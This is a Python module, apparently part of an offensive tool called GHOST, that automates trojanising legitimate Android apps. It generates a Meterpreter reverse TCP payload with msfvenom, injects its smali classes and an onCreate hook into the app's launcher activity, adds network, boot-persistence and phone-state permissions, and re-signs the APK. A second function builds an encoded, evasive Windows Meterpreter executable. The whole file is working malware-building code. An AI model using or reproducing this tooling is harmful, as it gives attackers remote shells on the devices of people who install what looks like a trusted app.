"""
GHOST v6.0 — Payload Factory Engine
Automates the binding, patching, and smali injection of malicious payloads into legitimate APKs.
"""

import os
import uuid

class PayloadFactory:
    """
    Handles autonomous Metasploit payload generation, APK decompilation,
    smali hooking, manifest patching, and signing.
    """
    def __init__(self, memory_manager, ethics_engine, bridge):
        self.memory = memory_manager
        self.ethics = ethics_engine
        self.bridge = bridge

    def generate_backdoored_apk(self, target_apk_path, lhost="192.168.1.100", lport=4444):
        """Build the overarching plan to backdoor a legitimate Android app via Smali Injection."""
        job_id = str(uuid.uuid4())[:8]
        out_apk = f"/tmp/ghost_payload_{job_id}.apk"
        work_dir = f"/tmp/apk_factory_{job_id}"
        
        return {
            "type": "payload_factory",
            "job_id": job_id,
            "target": target_apk_path,
            "phases": [
                {
                    "phase": 1,
                    "name": "Decompile Target APK",
                    "description": "Unpacking the original APK using apktool to access Smali source and AndroidManifest.",
                    "commands": [
                        {
                            "tool": "apktool",
                            "args": f"d {target_apk_path} -o {work_dir}",
                            "category": "ARSENAL"
                        }
                    ]
                },
                {
                    "phase": 2,
                    "name": "Generate Meterpreter Reverse TCP Payload",
                    "description": "Generate pure Android payload to be injected into the unpacked APK structure.",
                    "commands": [
                        {
                            "tool": "msfvenom",
                            "args": f"-p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {work_dir}/payload.apk",
                            "category": "EXPLOIT"
                        },
                        {
                            "tool": "apktool",
                            "args": f"d {work_dir}/payload.apk -o {work_dir}/payload_unpacked",
                            "category": "ARSENAL"
                        }
                    ]
                },
                {
                    "phase": 3,
                    "name": "Inject Smali Hook (MainActivity)",
                    "description": "Copy Metasploit Smali payload classes and hook the target's entry-point onCreate.",
                    "commands": [
                        {
                            "tool": "bash",
                            "args": f"-c 'cp -r {work_dir}/payload_unpacked/smali/com/metasploit {work_dir}/smali/com/'",
                            "category": "ARSENAL",
                            "description": "Copy Meterpreter Smali classes into target APK source tree",
                        },
                        {
                            "tool": "bash",
                            # Find the launcher activity's smali file and inject payload hook
                            # after the first .method onCreate line
                            "args": (
                                f"-c '"
                                f"MAIN_ACT=$(grep -rl \"action.MAIN\" {work_dir}/AndroidManifest.xml "
                                f"| head -1 && grep -oP \\'android:name=\"\\K[^\"\\']+\\' {work_dir}/AndroidManifest.xml "
                                f"| head -1); "
                                f"SMALI_PATH=$(echo \"$MAIN_ACT\" | tr \".\" \"/\"); "
                                f"SMALI_FILE=$(find {work_dir}/smali -path \"*${{SMALI_PATH}}.smali\" | head -1); "
                                f"if [ -n \"$SMALI_FILE\" ]; then "
                                f"  sed -i \"/\\.method.*onCreate/a \\"
                                f"    invoke-static {{p0}}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\" "
                                f"  \"$SMALI_FILE\"; "
                                f"  echo \"[+] Hooked $SMALI_FILE with Meterpreter payload\"; "
                                f"else "
                                f"  echo \"[-] Could not locate launcher activity smali\"; "
                                f"fi'"
                            ),
                            "category": "ARSENAL",
                            "description": "Inject invoke-static payload hook into launcher Activity's onCreate",
                        },
                    ]
                },
                {
                    "phase": 4,
                    "name": "Patch AndroidManifest.xml",
                    "description": "Add required permissions for network access and boot persistence.",
                    "commands": [
                        {
                            "tool": "bash",
                            "args": (
                                f"-c '"
                                f"MANIFEST=\"{work_dir}/AndroidManifest.xml\"; "
                                # Add permissions if they don't already exist
                                f"for PERM in INTERNET ACCESS_NETWORK_STATE ACCESS_WIFI_STATE "
                                f"RECEIVE_BOOT_COMPLETED READ_PHONE_STATE WAKE_LOCK; do "
                                f"  if ! grep -q \"android.permission.$PERM\" \"$MANIFEST\"; then "
                                f"    sed -i \"/<\\/manifest>/i \\"
                                f"    <uses-permission android:name=\\\"android.permission.$PERM\\\" />\" "
                                f"    \"$MANIFEST\"; "
                                f"    echo \"[+] Added permission: $PERM\"; "
                                f"  fi; "
                                f"done; "
                                f"echo \"[+] Manifest patching complete\"'"
                            ),
                            "category": "ARSENAL",
                            "description": "Inject INTERNET, BOOT_COMPLETED, and networking permissions",
                        }
                    ]
                },
                {
                    "phase": 5,
                    "name": "Recompile and Sign APK",
                    "description": "Packaging the modified source and signing it with apksigner.",
                    "commands": [
                        {
                            "tool": "apktool",
                            "args": f"b {work_dir} -o {out_apk}",
                            "category": "ARSENAL"
                        },
                        {
                            "tool": "apksigner",
                            # Use default debug keystore for automated signing
                            "args": f"sign --ks ~/.android/debug.keystore --ks-pass pass:android {out_apk}",
                            "category": "ARSENAL"
                        }
                    ]
                }
            ]
        }

    def generate_windows_payload(self, lhost="192.168.1.100", lport=4444, format="exe", encoder="x86/shikata_ga_nai", iterations=3):
        """Builds a highly evasive Windows payload using msfvenom."""
        job_id = str(uuid.uuid4())[:8]
        out_file = f"/tmp/ghost_payload_{job_id}.{format}"
        
        return {
            "type": "payload_factory",
            "job_id": job_id,
            "target": "windows",
            "phases": [
                {
                    "phase": 1,
                    "name": "Generate Encoded Windows Payload",
                    "description": f"Creating {format} payload with {encoder} encoding.",
                    "commands": [
                        {
                            "tool": "msfvenom",
                            "args": f"-p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e {encoder} -i {iterations} -f {format} -o {out_file}",
                            "category": "EXPLOIT"
                        }
                    ]
                }
            ]
        }

